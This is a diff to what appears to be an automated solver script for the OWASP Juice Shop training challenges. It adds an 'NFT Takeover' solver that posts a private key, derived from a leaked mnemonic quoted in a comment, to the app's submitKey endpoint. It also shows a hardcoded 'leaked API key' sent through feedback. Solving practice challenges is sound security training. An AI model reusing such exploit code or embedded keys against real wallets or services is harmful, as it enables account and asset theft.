@@ -110,3 +110,23 @@ def leaked_api_key(c: Client):
     key = "6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie"
     r = c.add_feedback(f"Leaked API key spotted in a product review: {key}", rating=3)
     ok(f"reported leaked API key via feedback ({r.status_code})")
+
+
+@register_solver("nftUnlockChallenge", "NFT Takeover (submit leaked private key)", CAT)
+def nft_unlock(c: Client):
+    # The Juice Shop server (routes/checkKeys.ts) derives the wallet's private key
+    # from a mnemonic that is accidentally leaked in the app's source/config:
+    #   "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch"
+    # Using ethers.js HDNodeWallet.fromPhrase() on that mnemonic yields this key
+    # for wallet 0x8343d2eb2B13A2495De435a1b15e85b98115Ce05:
+    private_key = "0x5bcc3e9d38baa06e7bfaab80ae5957bbe8ef059e640311d7d6d465e6bc948e3e"
+    r = c.s.post(c.url("/rest/web3/submitKey"),
+                 json={"privateKey": private_key},
+                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
+    if r.ok and r.json().get("success"):
+        ok(f"NFT wallet takeover succeeded ({r.status_code})")
+    else:
+        msg = r.json().get("message", "") if r.headers.get("content-type", "").startswith("application/json") else ""
+        warn(f"NFT unlock returned {r.status_code}: {msg}")
+
+
